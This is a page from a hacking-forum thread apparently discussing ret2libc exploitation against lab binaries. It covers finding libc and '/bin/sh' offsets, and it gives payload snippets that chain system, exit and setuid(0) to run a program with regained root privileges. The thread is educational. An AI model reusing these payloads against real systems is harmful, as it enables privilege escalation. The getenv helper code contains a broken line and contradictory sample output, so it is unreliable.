<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Exploiting Techniques \000 - ret2libc - Exploit Development - 0x00sec - The Home of the Hacker</title>
<meta name="description" content="So it‚Äôs been a while since I last wrote an article and I think it‚Äôs time for a new one. 
Since the straight forward smash stacking has already been covered plenty, I decided to start this serie with ret2libc. 
It is assu&amp;hellip;">
<meta name="generator" content="Discourse 3.1.0.beta6 - https://github.com/discourse/discourse version 80a1709965fa59da824b2e3392976fc6fc898f80">
<link rel="icon" type="image/png" href="../../uploads/default/optimized/2X/3/30c4e7d76acf879a124fdfe4d8d126afe628c189_2_32x32.png">
<link rel="apple-touch-icon" type="image/png" href="../../uploads/default/optimized/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e_2_180x180.png">
<meta name="theme-color" media="all" content="#171616">
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, user-scalable=yes, viewport-fit=cover">
<link rel="canonical" href="1833%3Fpage=2.html" />
<link rel="search" type="application/opensearchdescription+xml" href="../../opensearch.xml" title="0x00sec - The Home of the Hacker Search">
<link href="../../stylesheets/color_definitions_0x00sec-v2_15_57_a5ef387651921c3e4c7aa1108536015ba8299efb.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" class="light-scheme" />
<link href="../../stylesheets/desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop" />
<link href="../../stylesheets/chat_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="chat" />
<link href="../../stylesheets/discourse-details_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-details" />
<link href="../../stylesheets/discourse-lazy-videos_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-lazy-videos" />
<link href="../../stylesheets/discourse-local-dates_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-local-dates" />
<link href="../../stylesheets/discourse-narrative-bot_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-narrative-bot" />
<link href="../../stylesheets/discourse-presence_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-presence" />
<link href="../../stylesheets/discourse-spoiler-alert_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-spoiler-alert" />
<link href="../../stylesheets/docker_manager_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="docker_manager" />
<link href="../../stylesheets/poll_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="poll" />
<link href="../../stylesheets/chat_desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="chat_desktop" />
<link href="../../stylesheets/poll_desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="poll_desktop" />
<link href="../../stylesheets/desktop_theme_46_f36ade55bf80933494fe3b5fab518f477de3bd4e.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop_theme" data-theme-id="46" data-theme-name="header links v2" />
<link href="../../stylesheets/desktop_theme_57_8c0e890a61cdb4c5833a9f9c96664ed164e7d645.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop_theme" data-theme-id="57" data-theme-name="0x00sec-v2" />
<link rel="stylesheet" href="https://s3.amazonaws.com/0x00sec/monokai-sublime.css">
<script src="https://s3.amazonaws.com/0x00sec/highlight.pack.js"></script>
<link rel="preload" href="../../theme-javascripts/440fd21108f5ba9e5dfe06cca9fc842569d5a874.js%3F__ws=0x00sec.org" as="script">
<script defer src="../../theme-javascripts/440fd21108f5ba9e5dfe06cca9fc842569d5a874.js%3F__ws=0x00sec.org" data-theme-id="40"></script>
<link rel="alternate nofollow" type="application/rss+xml" title="RSS feed of &#39;Exploiting Techniques \000 - ret2libc&#39;" href="1833.rss" />
<meta property="og:site_name" content="0x00sec - The Home of the Hacker" />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:image" content="https://0x00sec.org/uploads/default/original/2X/2/27a5373af868edade07624e8205c46e79c247445.jpeg" />
<meta property="og:image" content="https://0x00sec.org/uploads/default/original/2X/2/27a5373af868edade07624e8205c46e79c247445.jpeg" />
<meta property="og:url" content="https://0x00sec.org/t/exploiting-techniques-000-ret2libc/1833?page=2" />
<meta name="twitter:url" content="https://0x00sec.org/t/exploiting-techniques-000-ret2libc/1833?page=2" />
<meta property="og:title" content="Exploiting Techniques \000 - ret2libc" />
<meta name="twitter:title" content="Exploiting Techniques \000 - ret2libc" />
<meta property="og:description" content="When finding libc_base, I typed in vmmap libc into GDB after running the program and breaking on main and there were a few entries so i just took one of them and added the address to the offset of ‚Äú/bin/sh‚Äù to obtain an address for ‚Äú/bin/sh‚Äù in libc.  I‚Äôm still unable to get the exploit working.  After jumping into system():" />
<meta name="twitter:description" content="When finding libc_base, I typed in vmmap libc into GDB after running the program and breaking on main and there were a few entries so i just took one of them and added the address to the offset of ‚Äú/bin/sh‚Äù to obtain an address for ‚Äú/bin/sh‚Äù in libc.  I‚Äôm still unable to get the exploit working.  After jumping into system():" />
<meta property="og:article:section" content="Exploit Development" />
<meta property="og:article:section:color" content="92278F" />
<meta name="twitter:label1" value="Reading time" />
<meta name="twitter:data1" value="8 mins üïë" />
<meta name="twitter:label2" value="Likes" />
<meta name="twitter:data2" value="67 ‚ù§" />
<meta property="article:published_time" content="2017-12-11T12:34:13+00:00" />
<meta property="og:ignore_canonical" content="true" />
<link rel="prev" href="index.html">
</head>
<body class="crawler ">
<div id="top-navbar" class="container">
<span id="top-navbar-links" style="display:none;">

<a href="https://init.0x00sec.org" class="dow-menu">Init</a>
<a href="https://discord.gg/c6BHVfn" class="dow-menu">Discord</a>
<a href="https://init.0x00sec.org/?partners" class="dow-menu">Partners</a>
</span>
</div>
<header>
<a href="../../index.html">
0x00sec - The Home of the Hacker
</a>
</header>
<div id="main-outlet" class="wrap" role="main">
<div id="topic-title">
<h1>
<a href="index.html">Exploiting Techniques \000 - ret2libc</a>
</h1>
<div class="topic-category" itemscope itemtype="http://schema.org/BreadcrumbList">
<span itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
<a href="../../c/exploit-development.html" class="badge-wrapper bullet" itemprop="item">
<span class="badge-category-bg" style="background-color: #92278F"></span>
<span class="badge-category clear-badge">
<span class="category-name" itemprop="name">Exploit Development</span>
</span>
</a>
<meta itemprop="position" content="1" />
</span>
</div>
</div>
<div itemscope itemtype="http://schema.org/DiscussionForumPosting">
<meta itemprop="headline" content="Exploiting Techniques \000 - ret2libc">
<meta itemprop="articleSection" content="Exploit Development">
<meta itemprop="keywords" content>
<div itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
<meta itemprop="name" content="0x00sec - The Home of the Hacker">
<div itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
<meta itemprop="url" content="https://0x00sec.org/uploads/default/original/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e.png">
</div>
</div>
<div id="post_21" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/WhiteCollar"><span itemprop="name">WhiteCollar</span></a>
</span>
<link itemprop="mainEntityOfPage" href="index.html">
<link itemprop="image" href="https://0x00sec.s3.amazonaws.com/original/2X/f/f65b9509eae36af14144a481abf845ec2462a305.png">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-12-11T12:34:13Z" class="post-time">
December 11, 2017, 12:34pm
</time>
<meta itemprop="dateModified" content="2017-12-11T12:34:13Z">
<span itemprop="position">21</span>
</span>
</div>
<div class="post" itemprop="text">
<p>When finding libc_base, I typed in vmmap libc into GDB after running the program and breaking on main and there were a few entries so i just took one of them and added the address to the offset of ‚Äú/bin/sh‚Äù to obtain an address for ‚Äú/bin/sh‚Äù in libc.</p>
<p>I‚Äôm still unable to get the exploit working.</p>
<p>After jumping into system():</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/f/f65b9509eae36af14144a481abf845ec2462a305.png" width="690" height="388"></p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_22" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/_py"><span itemprop="name">_py</span></a>
</span>
<link itemprop="mainEntityOfPage" href="index.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-12-11T12:55:38Z" class="post-time">
December 11, 2017, 12:55pm
</time>
<meta itemprop="dateModified" content="2017-12-11T12:55:38Z">
<span itemprop="position">22</span>
</span>
</div>
<div class="post" itemprop="text">
<p>I said <strong>libc base</strong>. You can‚Äôt just take whatever entry, you need to take the 1st one.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_23" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/0x00pf"><span itemprop="name">0x00pf</span></a>
(pico)
</span>
<link itemprop="mainEntityOfPage" href="index.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-12-11T17:03:29Z" class="post-time">
December 11, 2017, 5:03pm
</time>
<meta itemprop="dateModified" content="2017-12-11T17:03:29Z">
<span itemprop="position">23</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Hi <a class="mention" href="https://0x00sec.org/u/whitecollar">@WhiteCollar</a></p>
<p>The <code>system</code> function actually executes <code>/bin/sh -c command</code> (see the man page). An <code>sh: 1 something</code> means that you have successfully called <code>system</code> but with the wrong parameter. Whatever follows the <code>sh: 1 </code> is what you have tried to execute‚Ä¶ that may be non-printable garbage.</p>
<p>Said that, at first glance, it looks like everything is in place except the pointer to <code>/bin/sh</code>. To get it you can either do as <a class="mention" href="https://0x00sec.org/u/ioth1nkn0t">@IoTh1nkN0t</a> did (add it into the stack as part of the string you are entering and then push the appropriate pointer in your payload) or use the trick that <a class="mention" href="https://0x00sec.org/u/_py">@_py</a> indicated to get the string from libc at a fixed offset. I have to said that, just using <code>strings</code>, didn‚Äôt work for me. The offset I need is different of the one reported by <code>strings</code> (strings reports the file offset depending how your sections are mapped it may be different to the memory offset‚Ä¶ that does not happen with code whose file offset is usually 0).</p>
<p>So I wrote a small program to get the data I need for my current setup:</p>
<pre><code class="lang-auto">#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

// FIXME: Get size from the ELF 
//        Actually it should be fine to just search the .rodata section
#define SIZE  0x1fffff 

int main ()
{
  unsigned char *ptr, *ptr2;

  printf ("Libc base address: ");
  scanf ("%p", &amp;ptr);
  ptr2 = ptr;
  printf ("Looking for '/bin/sh'...");
  for (;ptr &lt; ptr2 + SIZE; ptr++)
    if (!strncmp (ptr, "/bin/sh\0", 7))
      {
	printf("Found at %p %x (%s)\n", ptr, ptr - ptr2, ptr);
	break; 
      }
}

</code></pre>
<p>For this post, that uses 32bits binaries I compiled with:</p>
<pre><code>gcc -m32 -o slibc slibc.c
</code></pre>
<p>The output from this tool on my system is: ( <code>0xf7e0d000</code> comes from <code>ldd</code>)</p>
<pre><code>$ ./slibc
Libc base address: 0xf7e0d000
Looking for '/bin/sh'...Found at 0xf7f4ecec 141cec (/bin/sh)
$ strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep "/bin/sh"
 162cec /bin/sh
</code></pre>
<p>Then using the address reported by the tool should work. At least, it worked for me.</p>
<p>Also note that you are running a PIE which may have a slightly different stack layout. In my tests I had to add 4 bytes to the ‚ÄòA‚Äô strings to get the exploit working with the PIE version. You can disable pie with the flag ‚Äò-no-pie‚Äô. Check with <code>file</code> to be sure you disabled it.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="4" />
<span class="post-likes">4 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="2" />
</div>
</div>
<div id="post_24" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/ricksanchez"><span itemprop="name">ricksanchez</span></a>
</span>
<link itemprop="mainEntityOfPage" href="index.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-12-11T17:18:15Z" class="post-time">
December 11, 2017, 5:18pm
</time>
<meta itemprop="dateModified" content="2017-12-11T17:18:15Z">
<span itemprop="position">24</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Slightly off-topic. But couldn‚Äôt resist <img src="../../images/emoji/twitter/smiley.png%3Fv=9" title=":smiley:" class="emoji" alt=":smiley:"></p>
<aside class="quote no-group" data-username="0x00pf" data-post="23" data-topic="1833">
<div class="title">
<div class="quote-controls"></div>
<img alt width="20" height="20" src="../../user_avatar/0x00sec.org/0x00pf/40/199_2.png" class="avatar"> 0x00pf:</div>
<blockquote>
<p>So I wrote a small program to get the data I need for my current setup:</p>
</blockquote>
</aside>
<p>Remember kids: If something doesn‚Äôt work with the tools provided, built your own.</p>
<ul>
<li>keeps your scripting/programming knowledge up2date</li>
<li>implants used knowledge even deeper</li>
<li>coolness factor+1</li>
</ul>
<p>Just fits perfectly after reading through <code>PoC||GTFO</code> right now and seeing the following all over it:</p>
<blockquote>
<p>Just built your own god damn birdfeeder</p>
</blockquote>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="5" />
<span class="post-likes">5 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_25" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/_py"><span itemprop="name">_py</span></a>
</span>
<link itemprop="mainEntityOfPage" href="index.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-12-11T19:18:23Z" class="post-time">
December 11, 2017, 7:18pm
</time>
<meta itemprop="dateModified" content="2017-12-11T20:52:29Z">
<span itemprop="position">25</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Either something is up with your system, or what‚Äôs more likely is that there is more than one occurrence of <code>/bin/sh</code> and strings outputs the latter offset for some weird reason (?).</p>
<p>PoC (x86_64 but doesn‚Äôt matter):</p>
<pre><code class="lang-makefile">&gt;&gt; strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep "/bin/sh"
18cd17 /bin/sh

gef‚û§ vmmap libc
Start              End                Offset             Perm Path
0x00007ffff7a0d000 0x00007ffff7bcd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7bcd000 0x00007ffff7dcd000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7dcd000 0x00007ffff7dd1000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7dd1000 0x00007ffff7dd3000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so
gef‚û§ x/s 0x00007ffff7a0d000 + 0x18cd17
0x7ffff7b99d17:	"/bin/sh"

</code></pre>
<p>Anyway the strings issue can be discussed on IRC. Unless <a class="mention" href="https://0x00sec.org/u/whitecollar">@WhiteCollar</a> has further questions this thread will close soon.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="3" />
<span class="post-likes">3 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_26" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/0x00pf"><span itemprop="name">0x00pf</span></a>
(pico)
</span>
<link itemprop="mainEntityOfPage" href="index.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-12-11T20:45:42Z" class="post-time">
December 11, 2017, 8:45pm
</time>
<meta itemprop="dateModified" content="2017-12-11T20:45:42Z">
<span itemprop="position">26</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Hi <a class="mention" href="https://0x00sec.org/u/_py">@_py</a>,</p>
<p>Just for anyone that is following the thread.</p>
<p>There is one single <code>"/bin/sh"</code> on my <code>libc</code>, otherwise, <code>strings</code> should had shown all of them. What you said is perfectly fine and my system is OK ;). It was may bad that I assume you were using the output of <code>ldd</code> as <code>libc_base</code> (that is what didn‚Äôt work for me) but you clearly said to use <code>gdb</code> and <code>vmmap</code>. A sentence that, for some reason, I filtered out.</p>
<p>I did the check and the offset produced in both cases is the same, however I have to admit that my little tool is a bit ad-hoc and probably won‚Äôt work for the general case.</p>
<p>Thanks for the clarification <a class="mention" href="https://0x00sec.org/u/_py">@_py</a></p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="4" />
<span class="post-likes">4 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_27" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/_py"><span itemprop="name">_py</span></a>
Closed
</span>
<link itemprop="mainEntityOfPage" href="index.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-12-12T09:19:12Z" class="post-time">
December 12, 2017, 9:19am
</time>
<meta itemprop="dateModified" content="2017-12-12T09:19:12Z">
<span itemprop="position">27</span>
</span>
</div>
<div class="post" itemprop="text">
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_28" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/IoTh1nkN0t"><span itemprop="name">IoTh1nkN0t</span></a>
Opened
</span>
<link itemprop="mainEntityOfPage" href="index.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-12-22T00:43:52Z" class="post-time">
December 22, 2017, 12:43am
</time>
<meta itemprop="dateModified" content="2017-12-22T00:43:52Z">
<span itemprop="position">28</span>
</span>
</div>
<div class="post" itemprop="text">
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_29" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/oaktree"><span itemprop="name">oaktree</span></a>
(oaktree)
Closed
</span>
<link itemprop="mainEntityOfPage" href="index.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-12-22T00:57:34Z" class="post-time">
December 22, 2017, 12:57am
</time>
<meta itemprop="dateModified" content="2017-12-22T00:57:34Z">
<span itemprop="position">29</span>
</span>
</div>
<div class="post" itemprop="text">
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_30" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/pry0cc"><span itemprop="name">pry0cc</span></a>
(Leader &amp; Offsec Engineer &amp; Forum Daddy)
Opened
</span>
<link itemprop="mainEntityOfPage" href="index.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2018-12-11T13:34:46Z" class="post-time">
December 11, 2018, 1:34pm
</time>
<meta itemprop="dateModified" content="2018-12-11T13:34:46Z">
<span itemprop="position">30</span>
</span>
</div>
<div class="post" itemprop="text">
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_31" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/guly"><span itemprop="name">guly</span></a>
(guly)
</span>
<link itemprop="mainEntityOfPage" href="index.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2018-12-11T14:08:21Z" class="post-time">
December 11, 2018, 2:08pm
</time>
<meta itemprop="dateModified" content="2018-12-11T14:08:21Z">
<span itemprop="position">31</span>
</span>
</div>
<div class="post" itemprop="text">
<p>hi there, a quick note about the use of environment variables and setuid() call on 32bit app/OS.<br>
we should already know that bash drop privs if not invoked with -p, but i also found that on most of my linuxes i loose suid privs when calling libc system().</p>
<p>let‚Äôs split this post in two part, the first task is to execute a path from env while the second task is to get back uid(0).</p>
<p>sometimes you don‚Äôt want, or can‚Äôt, spawn a shell but prefer to run another program or script, let‚Äôs call it /tmp/runme<br>
libc gadgets‚Äô are endless, but i bet you won‚Äôt find /tmp/runme anywhere, and here we can use the good ol‚Äô environment to store the string.</p>
<p>what we do is</p>
<blockquote>
<p>export RUNME=/tmp/runme</p>
</blockquote>
<p>if you google, you will surely found other example with more leading slashes because it can help to avoid wrong address, but we don‚Äôt really need it</p>
<p>now using any getenv like:</p>
<blockquote>
<p><span class="hashtag">#include</span> &lt;stdio.h&gt;<br>
<span class="hashtag">#include</span> &lt;stdlib.h&gt;<br>
<span class="hashtag">#include</span> &lt;string.h&gt;</p>
<p>int main(int argc, char *argv[]) {<br>
if(argc &lt; 3) {<br>
printf(‚ÄúUsage: %s &lt;environ_var&gt; &lt;target_program&gt;\n‚Äù, argv[0]);<br>
exit(-1);<br>
}</p>
<p>char *addr_ptr;<br>
addr_ptr = getenv(argv[1]);<br>
addr_ptr+= getenv(strlen(argv[0]) - strlen(argv[2]))*2;</p>
<p>if(addr_ptr == NULL) {<br>
printf(‚ÄúEnvironmental variable %s does not exist!\n‚Äù, argv[1]);<br>
exit(-1);<br>
}</p>
<p>printf("%s is stored at address %p\n", argv[1], addr_ptr);<br>
return(0);<br>
}</p>
</blockquote>
<p>we should find the address of our env var in memory:</p>
<blockquote>
<p>$ ./getenv RUNME stack6<br>
RUNME will be at 0xffffdf20<br>
also gdb can be used to address the same job using something like x/10s *((char **)environ), but gdb adds his own variable and the offset is slightly different.<br>
kept note that getenv finds RUNME at 0xbffff736, we place this address in runme var to get a mnemonic value.</p>
</blockquote>
<p>we now build our payload like:</p>
<blockquote>
<p>p = ‚ÄòA‚Äô*50 # arbitrary offset to achieve a stack overflow<br>
p+= p32(system)<br>
p+= p32(exit) # we like to keep it as clean as possible<br>
p+= p32(runme)</p>
</blockquote>
<p>and we will see your /tmp/runme executed.<br>
as i said before, i got stuck as uid(1000) too many times recently and i wanted to get back my beloved uid(0).</p>
<p>we can see lot of examples online about shellcodes that setuid/setruid but i started this with libc in mind and i wanted to finish in libc, so i used setuid().</p>
<p>and here is the second part, where we take our basic ret2libc and get it somewhere close to ROP to keep our privs.<br>
we indeed will use a pop ret instruction, pop ebp in this example to feed the call.<br>
we should be able to find setuid() call address in libc like we did for system() and exit() call, we just have to build our chain like this:</p>
<blockquote>
<p>p = ‚ÄòA‚Äô*50 # arbitrary offset to achieve a stack overflow<br>
p+= p32(setuid)<br>
p+= p32(popret) # pop ebp; ret<br>
p+= ‚Äú\x00\x00\x00\x00‚Äù<br>
p+= p32(system)<br>
p+= p32(exit) # we like to keep it as clean as possible<br>
p+= p32(runme)</p>
</blockquote>
<p>and we‚Äôre now uid(0) again</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="1" />
<span class="post-likes">1 Like</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
</div>
<div role="navigation" itemscope itemtype="http://schema.org/SiteNavigationElement" class="topic-body crawler-post">
<span itemprop="name"><a rel="prev" itemprop="url" href="index.html">‚Üê previous page</a></span>
</div>
</div>
<footer class="container wrap">
<nav class="crawler-nav">
<ul>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../index.html" itemprop="url">Home </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../categories.html" itemprop="url">Categories </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="https://0x00sec.org/guidelines" itemprop="url">FAQ/Guidelines </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../tos.html" itemprop="url">Terms of Service </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../privacy.html" itemprop="url">Privacy Policy </a>
</span>
</li>
</ul>
</nav>
<p class="powered-by-link">Powered by <a href="https://www.discourse.org">Discourse</a>, best viewed with JavaScript enabled</p>
</footer>
<script src="https://instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
</body>
</html>
